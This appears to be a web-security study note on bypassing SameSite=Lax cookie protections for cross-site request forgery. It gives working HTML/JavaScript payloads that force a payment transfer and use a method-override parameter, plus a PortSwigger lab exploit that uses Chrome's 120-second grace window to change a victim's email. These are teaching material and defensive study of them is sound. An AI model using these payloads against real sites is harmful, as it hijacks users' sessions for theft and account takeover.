# Bypassing SameSite Lax restrictions

### Table of content

- [Bypassing SameSite Lax restrictions using GET requests](#bypassing-samesite-lax-restrictions-using-get-requests)
- [Bypassing SameSite Lax restrictions with newly issued cookies](#bypassing-samesite-lax-restrictions-with-newly-issued-cookies)

## Bypassing SameSite Lax restrictions using GET requests

As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:

Simple GET:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Args provided by GET method, received by the servers as a POST method:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000&_method=POST';
</script>
```

Args provided as Post method, received by the servers as a GET method

Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

Other frameworks support a variety of similar parameters.

## Bypassing SameSite Lax restrictions with newly issued cookies

Cookies with Lax SameSite restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions.

As mentioned earlier, if a website doesn't include a SameSite attribute when setting a cookie, Chrome automatically applies Lax restrictions by default.

However, to avoid breaking single sign-on (SSO) mechanisms, it doesn't actually enforce these restrictions for the first 120 seconds on top-level POST requests.

As a result, there is a two-minute window in which users may be susceptible to cross-site attacks.

*This two-minute window does not apply to cookies that were explicitly set with the SameSite=Lax attribute.*

Why SSO Works Like This: SSO often involves redirects to an authentication server where a user logs in. If SameSite Lax immediately restricted cookies after login, it could disrupt SSO flows. SSO solutions typically set a session cookie during the authentication process, and they expect this session cookie to be included in the subsequent POST request back to the original site (to confirm successful authentication).

Therefore, this 120-second grace period allows SSO mechanisms to function correctly. During this time, the SameSite Lax restriction is not enforced for these cookies, and they can be sent with top-level POST requests, ensuring a smooth and secure Single Sign-On experience.

For example:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

This script first call :

```js
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }
```

This script open a popup on userclick interaction to refresh the token. When the token is refresh, the api make a POST call back to vuln site. This trigger a 120 sec timer where we can make POST request.

Then after the timing, script call this func to submit the POST request.

```js
    function changeEmail() {
        document.forms[0].submit();
    }
```

---

[**:arrow_right_hook: Back home**](/README.md)